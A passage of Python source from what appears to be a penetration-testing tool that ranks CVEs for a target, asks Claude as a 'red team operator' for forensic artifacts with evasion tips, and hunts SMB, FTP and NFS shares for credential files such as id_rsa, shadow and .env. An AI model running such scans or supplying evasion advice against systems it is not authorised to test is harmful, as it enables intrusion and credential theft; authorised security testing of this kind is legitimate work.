Limit victim_artifacts and attacker_artifacts to the 6 most impactful each."""

ARTIFACT_TYPE_COLOR = {
    "log": "yellow", "file": "cyan", "registry": "magenta",
    "memory": "red", "network": "blue", "process": "green",
}


def fetch_cve(cve_id: str) -> dict | None:
    if _OFFLINE_MODE:
        return None
    url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    try:
        r = requests.get(
            url, params={"cveId": cve_id}, timeout=12,
            headers={"User-Agent": "dig_champs/1.0"}
        )
        r.raise_for_status()
        vulns = r.json().get("vulnerabilities", [])
        if not vulns:
            return None
        cve = vulns[0]["cve"]
        desc = next(
            (d["value"] for d in cve.get("descriptions", []) if d.get("lang") == "en"),
            "No description available.",
        )
        metrics = cve.get("metrics", {})
        cvss = {}
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            entries = metrics.get(key, [])
            if entries:
                data = entries[0].get("cvssData", {})
                cvss = {
                    "version":              data.get("version", ""),
                    "baseScore":            data.get("baseScore"),
                    "severity":             entries[0].get("baseSeverity") or data.get("baseSeverity", ""),
                    "vector":               data.get("vectorString", ""),
                    "attackVector":         data.get("attackVector") or data.get("accessVector", ""),
                    "attackComplexity":     data.get("attackComplexity") or data.get("accessComplexity", ""),
                    "privilegesRequired":   data.get("privilegesRequired") or data.get("authentication", ""),
                    "userInteraction":      data.get("userInteraction", ""),
                    "scope":                data.get("scope", ""),
                    "confidentialityImpact":data.get("confidentialityImpact", ""),
                    "integrityImpact":      data.get("integrityImpact", ""),
                    "availabilityImpact":   data.get("availabilityImpact", ""),
                }
                break
        refs = [ref["url"] for ref in cve.get("references", [])[:5]]
        weaknesses = [
            w["description"][0]["value"]
            for w in cve.get("weaknesses", [])
            if w.get("description")
        ]
        return {
            "id":          cve_id.upper(),
            "description": desc,
            "cvss":        cvss,
            "references":  refs,
            "weaknesses":  weaknesses,
            "published":   cve.get("published", ""),
        }
    except Exception as e:
        console.print(f"[red]NVD lookup failed: {e}[/red]")
        return None


def analyze_artifacts(cve_data: dict) -> dict | None:
    if _OFFLINE_MODE or not _ANTHROPIC_KEY_PRESENT:
        return None
    prompt = f"""CVE ID: {cve_data['id']}
Description: {cve_data['description']}
CVSS Score: {cve_data['cvss'].get('baseScore')} ({cve_data['cvss'].get('severity')})
CVSS Vector: {cve_data['cvss'].get('vector')}
Attack Vector: {cve_data['cvss'].get('attackVector')}
Attack Complexity: {cve_data['cvss'].get('attackComplexity')}
Privileges Required: {cve_data['cvss'].get('privilegesRequired')}
User Interaction: {cve_data['cvss'].get('userInteraction')}
Confidentiality Impact: {cve_data['cvss'].get('confidentialityImpact')}
Integrity Impact: {cve_data['cvss'].get('integrityImpact')}
Availability Impact: {cve_data['cvss'].get('availabilityImpact')}
Weaknesses (CWE): {', '.join(cve_data['weaknesses']) if cve_data['weaknesses'] else 'unknown'}

Based on these details, identify the forensic artifacts that betray exploitation of this CVE."""

    ai_client = anthropic.Anthropic()
    with console.status("[bold cyan]Asking Claude to reason about artifacts…[/bold cyan]"):
        try:
            msg = ai_client.messages.create(
                model="claude-opus-4-6",
                max_tokens=2048,
                system=ARTIFACT_SYSTEM_PROMPT,
                messages=[{"role": "user", "content": prompt}],
            )
            raw = msg.content[0].text.strip()
            raw = raw.removeprefix("```json").removeprefix("```").removesuffix("```").strip()
            return json.loads(raw)
        except json.JSONDecodeError as e:
            console.print(f"[red]Failed to parse Claude response as JSON: {e}[/red]")
            return None
        except Exception as e:
            console.print(f"[red]Claude API error: {e}[/red]")
            return None


def print_cve_header(cve: dict):
    sev   = cve["cvss"].get("severity", "?")
    score = cve["cvss"].get("baseScore", "?")
    sev_color = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}.get(sev, "white")
    console.print(Panel(
        f"[bold white]{cve['id']}[/bold white]  [{sev_color}]{sev} {score}[/{sev_color}]\n\n"
        f"[white]{cve['description']}[/white]\n\n"
        f"[dim]Vector: {cve['cvss'].get('vector', '—')}[/dim]",
        title="[bold red]◈ CVE DETAILS ◈[/bold red]",
        border_style="red",
    ))


def print_artifact_analysis(analysis: dict):
    console.print(Panel(
        f"[bold white]Exploit class:[/bold white] [cyan]{analysis.get('exploit_class', '—')}[/cyan]\n"
        f"[bold white]Attack phases:[/bold white] {' → '.join(analysis.get('attack_phases', []))}",
        title="[bold red]◈ EXPLOIT PROFILE ◈[/bold red]",
        border_style="red",
    ))

    for section, key in [("VICTIM ARTIFACTS", "victim_artifacts"),
                          ("ATTACKER ARTIFACTS", "attacker_artifacts")]:
        items = analysis.get(key, [])
        if not items:
            continue
        t = Table(
            title=f"[bold red]{section}[/bold red]",
            box=box.SIMPLE_HEAD, show_lines=True, expand=True,
        )
        t.add_column("Type",     width=10)
        t.add_column("OS",       width=8)
        t.add_column("Artifact", width=28)
        t.add_column("Detail",   ratio=1)
        t.add_column("Evasion",  ratio=1)
        for item in items:
            typ = item.get("type", "")
            col = ARTIFACT_TYPE_COLOR.get(typ, "white")
            t.add_row(
                f"[{col}]{typ}[/{col}]",
                item.get("os", "—"),
                f"[bold]{item.get('artifact', '—')}[/bold]",
                item.get("detail", "—"),
                f"[dim]{item.get('evasion_tip', '—')}[/dim]",
            )
        console.print(t)

    iocs = analysis.get("iocs", [])
    if iocs:
        t2 = Table(
            title="[bold red]INDICATORS OF COMPROMISE[/bold red]",
            box=box.SIMPLE_HEAD, expand=True,
        )
        t2.add_column("IOC")
        for ioc in iocs:
            t2.add_row(ioc)
        console.print(t2)

    tools = analysis.get("detection_tools", [])
    if tools:
        console.print(
            "\n[bold white]Detection tools:[/bold white] "
            + "  ".join(f"[cyan]{t}[/cyan]" for t in tools)
        )


ARTIFACT_BATCH_SYSTEM = """You are a senior red team operator and forensic analyst.
Given a list of CVEs discovered on a target, produce a SINGLE JSON object covering ALL of them.
Return ONLY raw JSON — no markdown fences, no preamble.

Schema:
{
  "target_profile": "<one-line summary of the target attack surface>",
  "attack_narrative": "<2-3 sentence kill-chain narrative tying all CVEs together>",
  "cves": [
    {
      "id": "<CVE-XXXX-XXXXX>",
      "exploit_class": "<brief category>",
      "attack_phases": ["<phase>", ...],
      "victim_artifacts": [
        {
          "artifact": "<path/name>",
          "type": "<log|file|registry|memory|network|process>",
          "os": "<Windows|Linux|Both|Any>",
          "detail": "<what it shows>",
          "evasion_tip": "<one-line tip>"
        }
      ],
      "attacker_artifacts": [
        {
          "artifact": "<path/name>",
          "type": "<log|file|network|memory>",
          "detail": "<why it exists>",
          "evasion_tip": "<one-line tip>"
        }
      ],
      "detection_tools": ["<tool>", ...],
      "iocs": ["<ioc>", ...]
    }
  ]
}

Limit victim_artifacts and attacker_artifacts to 5 each per CVE.
Be specific: real file paths, registry keys, Event IDs, log patterns."""


def run_artifacts_lookup(cve_ids: list[str]) -> list[dict]:
    """Batch-fetch all CVEs from NVD then make a single Claude API call for all."""
    if not cve_ids:
        console.print("[dim][~] No CVEs found — skipping artifact analysis[/dim]")
        return []
    if _OFFLINE_MODE:
        console.print("[dim][~] Offline mode — artifact analysis skipped[/dim]")
        return []

    console.print(f"\n[bold cyan][+] Artifact analysis for {len(cve_ids)} CVE(s) — batching…[/bold cyan]")

    # Fetch NVD data for all CVEs
    cve_data_list = []
    for cve_id in cve_ids:
        with console.status(f"[bold cyan]Fetching {cve_id} from NVD…[/bold cyan]"):
            data = fetch_cve(cve_id)
        if data:
            cve_data_list.append(data)
            print_cve_header(data)
        else:
            console.print(f"[yellow]Could not retrieve NVD data for {cve_id}[/yellow]")

    if not cve_data_list:
        return []

    # Build a single batched prompt
    cve_blocks = []
    for d in cve_data_list:
        cve_blocks.append(
            f"CVE: {d['id']}\n"
            f"Description: {d['description']}\n"
            f"CVSS: {d['cvss'].get('baseScore')} ({d['cvss'].get('severity')})\n"
            f"Vector: {d['cvss'].get('vector')}\n"
            f"Attack Vector: {d['cvss'].get('attackVector')}\n"
            f"Complexity: {d['cvss'].get('attackComplexity')}\n"
            f"Privs Required: {d['cvss'].get('privilegesRequired')}\n"
            f"CWE: {', '.join(d['weaknesses']) if d['weaknesses'] else 'unknown'}"
        )
    prompt = (
        f"Analyse all {len(cve_data_list)} CVE(s) found on the target and "
        f"produce the batched artifact JSON.\n\n"
        + "\n\n---\n\n".join(cve_blocks)
    )

    ai_client = anthropic.Anthropic()
    with console.status("[bold cyan]Claude reasoning over all CVEs…[/bold cyan]"):
        try:
            msg = ai_client.messages.create(
                model="claude-opus-4-6",
                max_tokens=4096,
                system=ARTIFACT_BATCH_SYSTEM,
                messages=[{"role": "user", "content": prompt}],
            )
            raw = msg.content[0].text.strip()
            raw = raw.removeprefix("```json").removeprefix("```").removesuffix("```").strip()
            result = json.loads(raw)
        except json.JSONDecodeError as e:
            console.print(f"[red]Failed to parse batched Claude response: {e}[/red]")
            return []
        except Exception as e:
            console.print(f"[red]Claude API error: {e}[/red]")
            return []

    # Display narrative header
    console.print(Panel(
        f"[bold white]Target profile:[/bold white] {result.get('target_profile','—')}\n\n"
        f"[bold white]Kill-chain narrative:[/bold white]\n{result.get('attack_narrative','—')}",
        title="[bold red]◈ BATCHED ARTIFACT ANALYSIS ◈[/bold red]",
        border_style="red",
    ))

    # Display per-CVE artifact tables
    for cve_analysis in result.get("cves", []):
        console.print(f"\n[bold cyan]── {cve_analysis.get('id','')} ──[/bold cyan]")
        print_artifact_analysis(cve_analysis)

    # Build structured findings for persistence in the main findings list
    artifact_findings: list[dict] = [{
        "src":              "dc_artifacts",
        "artifact_type":    "narrative",
        "target_profile":   result.get("target_profile", ""),
        "attack_narrative": result.get("attack_narrative", ""),
    }]
    for cve_analysis in result.get("cves", []):
        artifact_findings.append({
            "src":               "dc_artifacts",
            "artifact_type":     "cve_analysis",
            "cve_id":            cve_analysis.get("id"),
            "exploit_class":     cve_analysis.get("exploit_class"),
            "iocs":              cve_analysis.get("iocs", []),
            "detection_tools":   cve_analysis.get("detection_tools", []),
            "victim_artifacts":  cve_analysis.get("victim_artifacts", []),
            "attacker_artifacts": cve_analysis.get("attacker_artifacts", []),
        })
    return artifact_findings


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 5 — VULN REPORT  (from dc_vulnreport)
# ══════════════════════════════════════════════════════════════════════════════
#
# Multi-source CVE ranking for findings accumulated across all phases.
#   SEV_SCORE               — numeric weight for CRITICAL/HIGH/MEDIUM/LOW/NONE
#   fetch_nvd() / fetch_osv() — pull CVE data from NVD and OSV databases
#   _sev_label(f)           — normalises any finding dict to CRITICAL/HIGH/MEDIUM/LOW/INFO
#                             NOTE: also imported by §13 compute_audit_diff for flagging
#   run_vulnreport()        — scores all CVE findings, de-dupes, returns top-10 list
#   print_vuln_report()     — rich table of ranked CVEs with CVSS + exploitability
#
# Takes input from: full findings list (all phases combined)
# Feeds into: §4 artifacts phase (top-10 CVE IDs passed in preference to raw findings)
#             main findings list (src="dc_vulnreport" entries added per ranked CVE)

SEV_SCORE = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "NONE": 0, "UNKNOWN": 0}


def ease_score(cvss: dict) -> int:
    score = 0
    if cvss.get("attackVector")         in ("NETWORK",):    score += 1
    if cvss.get("attackComplexity")     in ("LOW",):        score += 1
    if cvss.get("privilegesRequired")   in ("NONE", "LOW"): score += 1
    return score


def http_get(url: str, params=None, retries: int = 3, delay: float = 1.5):
    for attempt in range(retries):
        try:
            r = requests.get(
                url, params=params, timeout=12,
                headers={"User-Agent": "dig_champs/1.0"},
            )
            if r.status_code == 429:
                time.sleep(delay * (attempt + 1))
                continue
            r.raise_for_status()
            return r.json()
        except KeyboardInterrupt:
            console.print(f"[dim]  ↳ request interrupted ({url}) — skipping[/dim]")
            return None
        except Exception as e:
            if attempt == retries - 1:
                console.print(f"[dim]  ↳ request failed ({url}): {e}[/dim]")
    return None


def cvss_fields(metrics: dict) -> dict:
    for key in ("cvssMetricV31", "cvssMetricV30"):
        entries = metrics.get(key, [])
        if entries:
            data = entries[0].get("cvssData", {})
            return {
                "baseScore":          data.get("baseScore"),
                "baseSeverity":       data.get("baseSeverity", "UNKNOWN").upper(),
                "attackVector":       data.get("attackVector", ""),
                "attackComplexity":   data.get("attackComplexity", ""),
                "privilegesRequired": data.get("privilegesRequired", ""),
                "userInteraction":    data.get("userInteraction", ""),
            }
    for entry in metrics.get("cvssMetricV2", []):
        data = entry.get("cvssData", {})
        sev  = entry.get("baseSeverity", "UNKNOWN").upper()
        return {
            "baseScore": data.get("baseScore"), "baseSeverity": sev,
            "attackVector": data.get("accessVector", ""),
            "attackComplexity": data.get("accessComplexity", ""),
            "privilegesRequired": data.get("authentication", ""),
            "userInteraction": "",
        }
    return {
        "baseScore": None, "baseSeverity": "UNKNOWN",
        "attackVector": "", "attackComplexity": "",
        "privilegesRequired": "", "userInteraction": "",
    }


def query_nvd(keyword: str) -> list[dict]:
    if _OFFLINE_MODE:
        return []
    data = http_get(
        "https://services.nvd.nist.gov/rest/json/cves/2.0",
        params={"keywordSearch": keyword, "resultsPerPage": 5},
    )
    if not data:
        return []
    results = []
    for item in data.get("vulnerabilities", []):
        cve    = item.get("cve", {})
        cve_id = cve.get("id", "")
        desc   = next(
            (d["value"] for d in cve.get("descriptions", []) if d.get("lang") == "en"), ""
        )
        fields = cvss_fields(cve.get("metrics", {}))
        results.append({**fields, "cve_id": cve_id, "desc": desc[:200],
                         "source": "NVD", "keyword": keyword})
    return results


def query_cve_program(cve_id: str) -> dict | None:
    if _OFFLINE_MODE:
        return None
    data = http_get(f"https://cveawg.mitre.org/api/cve/{cve_id}")
    if not data:
        return None
    containers = data.get("containers", {}).get("cna", {})
    desc = next(
        (d["value"] for d in containers.get("descriptions", [])
         if d.get("lang", "").startswith("en")),
        "",
    )
    return {
        "cve_id": cve_id, "desc": desc[:200], "source": "CVE Program",
        "keyword": cve_id, "baseScore": None, "baseSeverity": "UNKNOWN",
        "attackVector": "", "attackComplexity": "",
        "privilegesRequired": "", "userInteraction": "",
    }


def query_osv(keyword: str) -> list[dict]:
    if _OFFLINE_MODE:
        return []
    try:
        r = requests.post(
            "https://api.osv.dev/v1/query",
            json={"query": {"package": {"name": keyword}}},
            timeout=10,
            headers={"User-Agent": "dig_champs/1.0"},
        )
        r.raise_for_status()
        vulns = r.json().get("vulns", [])
    except Exception:
        vulns = []
    results = []
    for v in vulns[:5]:
        results.append({
            "cve_id":             v.get("id", ""),
            "desc":               (v.get("summary") or v.get("details", ""))[:200],
            "source":             "OSV",
            "keyword":            keyword,
            "baseScore":          None,
            "baseSeverity":       "UNKNOWN",
            "attackVector":       "",
            "attackComplexity":   "",
            "privilegesRequired": "",
            "userInteraction":    "",
        })
    return results


def query_govuln(keyword: str) -> list[dict]:
    if _OFFLINE_MODE:
        return []
    try:
        r = requests.get(
            "https://vuln.go.dev/index/vulns.json", timeout=10,
            headers={"User-Agent": "dig_champs/1.0"},
        )
        r.raise_for_status()
        all_vulns = r.json()
    except Exception:
        return []
    kw      = keyword.lower()
    results = []
    for v in all_vulns:
        vid     = v.get("id", "")
        aliases = v.get("aliases", [])
        if kw in vid.lower() or (aliases and kw in aliases[0].lower()):
            results.append({
                "cve_id":             vid,
                "desc":               "",
                "source":             "Go Vuln DB",
                "keyword":            keyword,
                "baseScore":          None,
                "baseSeverity":       "UNKNOWN",
                "attackVector":       "",
                "attackComplexity":   "",
                "privilegesRequired": "",
                "userInteraction":    "",
            })
            if len(results) >= 3:
                break
    return results


def dedup_vulns(vulns: list[dict]) -> list[dict]:
    seen = {}
    for v in vulns:
        key = v["cve_id"] or f"{v['source']}:{v['keyword']}"
        if key not in seen:
            seen[key] = v
        elif seen[key]["baseScore"] is None and v["baseScore"] is not None:
            seen[key] = v
    return list(seen.values())


def rank_vulns(vulns: list[dict]) -> list[dict]:
    def sort_key(v):
        sev   = SEV_SCORE.get(v.get("baseSeverity", "UNKNOWN"), 0)
        ease  = ease_score(v)
        score = float(v["baseScore"]) if v.get("baseScore") else 0.0
        return (sev, ease, score)
    return sorted(vulns, key=sort_key, reverse=True)


def extract_keywords(findings: list[dict]) -> list[str]:
    kws = set()
    for f in findings:
        if "cve"     in f: kws.add(f["cve"])
        if "service" in f: kws.add(f["service"])
        if "tech"    in f: kws.add(f["tech"])
        if "issue"   in f: kws.add(f["issue"])
    return [k for k in kws if k]


def query_all_vuln_dbs(keywords: list[str], known_cves: list[str]) -> list[dict]:
    all_vulns = []
    sources = [
        ("NVD",        query_nvd),
        ("OSV",        query_osv),
        ("Go Vuln DB", query_govuln),
    ]
    with console.status("[bold cyan]Querying vulnerability databases…[/bold cyan]"):
        for cve_id in known_cves:
            result = query_cve_program(cve_id)
            if result:
                all_vulns.append(result)
            all_vulns.extend(query_nvd(cve_id))
            time.sleep(0.4)
        for kw in keywords:
            for src_name, fn in sources:
                console.print(f"  [dim]→ {src_name}: {kw}[/dim]")
                all_vulns.extend(fn(kw))
                time.sleep(0.3)
    return all_vulns


def print_vuln_report(top10: list[dict], target: str, output_path: str | None = None):
    sev_color = {
        "CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow",
        "LOW": "green", "UNKNOWN": "dim", "NONE": "dim",
    }
    console.print(Panel(
        f"[bold white]TARGET:[/bold white] [cyan]{target}[/cyan]\n"
        f"[bold white]TOP-10 VULNERABILITIES[/bold white] — ranked by severity then exploitability",
        title="[bold red]◈ DC VULN REPORT ◈[/bold red]",
        border_style="red",
    ))

    table = Table(box=box.SIMPLE_HEAD, show_lines=True, expand=True)
    table.add_column("#",         style="bold", width=3)
    table.add_column("CVE / ID",               width=20)
    table.add_column("Severity",               width=10)
    table.add_column("CVSS",                   width=6)
    table.add_column("Ease",                   width=6)
    table.add_column("Source",                 width=14)
    table.add_column("Description",            ratio=1)

    for i, v in enumerate(top10, 1):
        sev   = v.get("baseSeverity", "UNKNOWN")
        score = f"{v['baseScore']:.1f}" if v.get("baseScore") else "—"
        stars = "★" * ease_score(v) or "—"
        col   = sev_color.get(sev, "white")
        table.add_row(
            str(i),
            v.get("cve_id", "—"),
            f"[{col}]{sev}[/{col}]",
            score,
            stars,
            v.get("source", "—"),
            v.get("desc", "—"),
        )
    console.print(table)

    if output_path:
        out = [
            {k: v[k] for k in ("cve_id", "baseSeverity", "baseScore", "source", "keyword", "desc")}
            for v in top10
        ]
        Path(output_path).write_text(
            json.dumps({"target": target, "top10": out}, indent=2)
        )
        console.print(f"\n[green]✓ Vuln report saved → {output_path}[/green]")


def run_vulnreport(findings: list[dict], target: str, output_path: str | None = None) -> list[dict]:
    known_cves = [f["cve"] for f in findings if "cve" in f]
    keywords   = extract_keywords(findings)

    if not known_cves and not keywords:
        console.print("[dim][~] No CVEs or keywords to query — skipping vuln report[/dim]")
        return []

    console.print(
        f"\n[bold][+] Vuln report: {len(known_cves)} CVEs, {len(keywords)} keywords[/bold]"
    )
    raw_vulns = query_all_vuln_dbs(keywords, known_cves)
    unique    = dedup_vulns(raw_vulns)
    ranked    = rank_vulns(unique)
    top10     = ranked[:10]

    if not top10:
        console.print("[yellow]No vulnerabilities found across all sources.[/yellow]")
        return []

    print_vuln_report(top10, target, output_path)
    return top10


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 6 — HIGH-VALUE FILE HUNT  (remote via nmap NSE + SMB enumeration)
# ══════════════════════════════════════════════════════════════════════════════
#
# Discovers sensitive files via three complementary vectors.
#   HVF_CATEGORIES           — category key → {label, colour, pattern list}
#                              (credentials, configs, keys, backups, databases, scripts)
#   _classify_file(name)     — returns category key for a filename, or None if not sensitive
#   _nmap_hvf_scan()         — runs nmap NSE smb-ls / ftp-anon discovery scripts
#   _enum_smb_shares()       — lists accessible SMB shares (null session + cracked creds)
#   _smbclient_list()        — recursive smbclient listing of a single share
#   _extract_paths_from_text() — regex-parses raw tool output for file paths
#   run_hvf_scan()           — orchestrates: NSE → SMB shares → FTP anon → FTP auth
#                              Gap 4: also uses cracked FTP creds from cred_hits
#
# Takes input from: nmap_output (service detection), cred_hits (§3 SMB + FTP creds)
# Feeds into: main findings list (src="dc_hvf"), live_adapt trigger "SMB null→filehunt"

# ── Category definitions ──────────────────────────────────────────────────────

HVF_CATEGORIES = {
    "credentials": {
        "label":   "Credentials & Secrets",
        "color":   "bold red",
        "exts":    {".env", ".pem", ".key", ".p12", ".pfx", ".ppk", ".ovpn",
                    ".htpasswd", ".netrc", ".pgpass", ".kwallet"},
        "names":   {"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
                    "passwords.txt", "passwords.lst", "creds.txt", "creds.json",
                    "secrets.yml", "secrets.yaml", "secrets.json",
                    ".env", ".env.local", ".env.production", ".env.backup",
                    "shadow", "passwd", "master.key", "credentials",
                    "credentials.xml", "credentials.json", "vault.json",
                    ".vault-token", "terraform.tfvars", "pass.txt",
                    "apikeys.txt", "api_keys.txt", "token.txt"},
        "patterns": [r"password", r"passwd", r"secret", r"apikey", r"api_key",
                     r"token", r"credential", r"\.env"],
    },
    "configs": {
        "label":   "Config Files",
        "color":   "yellow",
        "exts":    {".conf", ".config", ".cfg", ".ini", ".xml", ".yaml", ".yml",
                    ".toml", ".properties", ".htaccess"},
        "names":   {"web.config", "php.ini", "httpd.conf", "nginx.conf",
                    "apache2.conf", "my.cnf", "my.ini", "postgresql.conf",
                    "redis.conf", "mongod.conf", "sshd_config", "ssh_config",
                    "smb.conf", "krb5.conf", "ldap.conf", "database.yml",
                    "database.yaml", "settings.py", "local_settings.py",
                    "wp-config.php", "config.php", "configuration.php",
                    "config.xml", "applicationContext.xml", "struts.xml",
                    "web.xml", "server.xml", "context.xml", "boot.properties",
                    "application.properties", "application.yml",
                    "appsettings.json", ".htaccess", "Dockerfile",
                    "docker-compose.yml", "docker-compose.yaml"},
        "patterns": [r"config", r"settings", r"setup", r"install"],
    },
    "backups": {
        "label":   "Backup & Archive Files",
        "color":   "magenta",
        "exts":    {".bak", ".backup", ".old", ".orig", ".save", ".swp", ".tmp",
                    ".sql", ".dump", ".tar", ".gz", ".tgz", ".zip", ".rar",
                    ".7z", ".tar.gz", ".tar.bz2", ".tar.xz", ".db", ".sqlite",
                    ".sqlite3", ".mdb", ".accdb"},
        "names":   {"backup.sql", "dump.sql", "database.sql", "db.sql",
                    "data.sql", "backup.zip", "backup.tar.gz", "site.tar.gz",
                    "www.zip", "htdocs.zip", "public_html.zip",
                    "backup.tar", "full_backup.zip", "db_backup.sql"},
        "patterns": [r"backup", r"dump", r"\.bak$", r"\.old$", r"archive"],
    },
    "documents": {
        "label":   "Office & Document Files",
        "color":   "cyan",
        "exts":    {".docx", ".doc", ".xlsx", ".xls", ".csv", ".pdf",
                    ".pptx", ".ppt", ".odt", ".ods", ".odp",
                    ".kdbx", ".kdb", ".1pux", ".psafe3"},
        "names":   {"passwords.kdbx", "keepass.kdbx", "database.kdbx",
                    "pass.kdbx", "logins.kdbx"},
        "patterns": [r"password", r"finance", r"salary", r"payroll",
                     r"invoice", r"budget", r"confidential", r"secret",
                     r"private", r"internal", r"sensitive"],
    },
    "source_code": {
        "label":   "Source Code & Scripts",
        "color":   "green",
        "exts":    {".py", ".rb", ".php", ".sh", ".bash", ".zsh", ".pl",
                    ".ps1", ".psm1", ".psd1", ".js", ".ts", ".go", ".java",
                    ".cs", ".cpp", ".c", ".lua"},
        "names":   {"deploy.sh", "deploy.py", "setup.sh", "install.sh",
                    "migrate.sh", "backup.sh", "cron.sh", "update.sh",
                    "maintenance.sh", "init.sh", "start.sh", "run.sh",
                    "Makefile", "Rakefile", "Gruntfile.js", "Gulpfile.js"},
        "patterns": [r"password\s*=", r"passwd\s*=", r"secret\s*=",
                     r"api_key\s*=", r"token\s*=", r"db_pass", r"aws_secret",
                     r"private_key", r"BEGIN.*PRIVATE KEY"],
    },
}

# ── SMB share/file enumeration helpers ───────────────────────────────────────

SMB_INTERESTING_SHARES = {
    "SYSVOL", "NETLOGON", "C$", "ADMIN$", "IPC$", "Users", "Shared",
    "Public", "Backup", "Data", "Files", "IT", "Dev", "Development",
    "Finance", "HR", "Docs", "Documents", "Home", "Homes", "FTP",
    "Upload", "Uploads", "Drop", "Temp", "Tmp", "Archive", "Archives",
    "Backup", "Backups", "Scripts", "Tools", "Software", "Install",
}


def _all_hvf_exts() -> set[str]:
    exts = set()
    for cat in HVF_CATEGORIES.values():
        exts.update(cat["exts"])
    return exts


def _all_hvf_names() -> set[str]:
    names = set()
    for cat in HVF_CATEGORIES.values():
        names.update(n.lower() for n in cat["names"])
    return names


def _classify_file(filename: str) -> str | None:
    """Return category key for a filename, or None if not high-value."""
    fn_lower  = filename.lower()
    fn_stem   = Path(fn_lower).stem
    fn_suffix = Path(fn_lower).suffix

    # Multi-part extension (.tar.gz, .tar.bz2)
    multi_ext = "." + ".".join(fn_lower.split(".")[-2:]) if fn_lower.count(".") >= 2 else ""

    for cat_key, cat in HVF_CATEGORIES.items():
        if fn_lower in {n.lower() for n in cat["names"]}:
            return cat_key
        if fn_suffix in cat["exts"] or (multi_ext and multi_ext in cat["exts"]):
            return cat_key
        for pat in cat["patterns"]:
            if re.search(pat, fn_lower, re.IGNORECASE):
                return cat_key
    return None


# ── nmap NSE file-discovery scan ─────────────────────────────────────────────

NSE_SCRIPTS = [
    "http-ls",
    "http-enum",
    "smb-enum-shares",
    "smb-ls",
    "ftp-anon",
    "ftp-ls",
    "nfs-ls",
    "nfs-showmount",
    "rsync-list-modules",
]


def _nmap_hvf_scan(target: str, mode: int, tmpdir: str) -> str:
    """Run nmap NSE scripts targeting file-exposure services."""
    # Timing per mode
    timing = {1: "-T1", 2: "-T2", 3: "-T4", 4: "-T5"}[mode]
    out    = os.path.join(tmpdir, "hvf_nmap.txt")
    scripts = ",".join(NSE_SCRIPTS)
    args = [
        "nmap", timing,
        "-p", "21,22,80,139,443,445,873,2049,2121,3000,3306,5000,8000,8080,8443,8888",
        "--script", scripts,
        "--script-args", "http-ls.maxfiles=100,smb-ls.maxfiles=100",
        "-oN", out,
        target,
    ]
    run_cmd(args, out, timeout=600)
    return read_file(out)


# ── smbclient recursive listing ───────────────────────────────────────────────

def _smbclient_list(target: str, share: str, tmpdir: str,
                    username: str = "", password: str = "") -> str:
    """Try to list a share recursively via smbclient (null or cred session)."""
    if not avail("smbclient"):
        return ""
    out  = os.path.join(tmpdir, f"smb_{share}.txt")
    # Pass password via PASSWD env var to avoid exposure in process argument list
    smb_env = {**os.environ, "PASSWD": password} if username else os.environ.copy()
    auth = ["-U", username] if username else ["-N"]
    args = ["smbclient", f"//{target}/{share}"] + auth + [
        "-c", "recurse ON; ls",
    ]
    try:
        with open(out, "w") as f:
            subprocess.run(
                args, stdout=f, stderr=subprocess.DEVNULL,
                text=True, timeout=120, env=smb_env,
            )
    except subprocess.TimeoutExpired:
        pass
    return read_file(out)


def _enum_smb_shares(target: str, tmpdir: str) -> list[str]:
    """Return list of share names via net/smbclient or fall back to enum4linux output."""
    shares = []
    if avail("smbclient"):
        try:
            r = subprocess.run(
                ["smbclient", "-L", f"//{target}", "-N"],
                capture_output=True, text=True, timeout=30,
            )
            for line in r.stdout.splitlines():
                m = re.match(r"\s+(\S+)\s+(?:Disk|IPC|Printer)", line)
                if m:
                    shares.append(m.group(1))
        except Exception:
            pass
    return shares


# ── Parse raw NSE / smbclient output for filenames ───────────────────────────

def _extract_paths_from_text(text: str) -> list[str]:
    """
    Extract file paths from mixed nmap/smbclient/ftp-ls output.
    Uses format-aware parsers per tool rather than a single loose regex.
    """
    paths: list[str] = []
    seen:  set[str]  = set()

    def add(p: str):
        p = p.strip()
        if p and p not in seen and len(p) < 512:
            seen.add(p)
            paths.append(p)

    for line in text.splitlines():
        # ── smbclient recursive ls ────────────────────────────────────────
        # Format:  \subdir\file.ext                     NNN  Mon Jan  1 00:00:00 2024
        m = re.match(r"\s*(\\[\\A-Za-z0-9 _.,()\[\]{}&@#%!^~+=\-]+)\s+\d+\s+\w", line)
        if m:
            add(m.group(1).replace("\\", "/"))
            continue

        # ── nmap http-ls / http-enum ──────────────────────────────────────
        # Format:  | /path/to/file.ext   200
        # Format:  |   /dir/             (directories, skip)
        m = re.match(r"\|\s+((?:/[^\s|/][^\s|]*)+)\s", line)
        if m:
            candidate = m.group(1)
            if "." in Path(candidate).name:  # must have extension
                add(candidate)
            continue

        # ── nfs-ls / ftp-ls (ls -l style) ────────────────────────────────
        # Format:  -rw-r--r--  1 user group  12345 Jan  1 00:00 filename.ext
        m = re.match(
            r"\s*[-d][\w-]{9}\s+\d+\s+\S+\s+\S+\s+\d+\s+"
            r"\w{3}\s+\d+\s+[\d:]+\s+(.+)$",
            line,
        )
        if m:
            fname = m.group(1).strip()
            if fname and "." in fname and not fname.startswith("."):
                add(fname)
            continue

        # ── nmap smb-ls / smb-enum-shares (| path lines) ─────────────────
        # Format:  |   \path\file.ext
        m = re.match(r"\|\s+(\\[\\A-Za-z0-9 _.,()\[\]]+)\s*$", line)
        if m:
            add(m.group(1).replace("\\", "/"))
            continue

        # ── rsync modules listing ─────────────────────────────────────────
        # Format:  modulename    Comment text
        m = re.match(r"^\s*(\w[\w._-]+)\s{2,}", line)
        if m and "rsync" in text[:500].lower():
            add(m.group(1))

    return paths


# ── Main file hunt orchestrator ───────────────────────────────────────────────

def run_hvf_scan(
    target: str,
    mode: int,
    tmpdir: str,
    nmap_output: str,
    cred_hits: list[dict] | None = None,
) -> list[dict]:
    """
    Discover high-value files on the target.
    Returns list of finding dicts ready to merge into the main findings list.
    """
    console.print("\n[bold cyan][+] High-Value File Hunt…[/bold cyan]")
    findings: list[dict] = []
    seen_paths: set[str] = set()

    def record(path: str, filename: str, source: str, share: str = ""):
        cat = _classify_file(filename)
        if not cat:
            return
        norm = path.lower()
        if norm in seen_paths:
            return
        seen_paths.add(norm)
        findings.append({
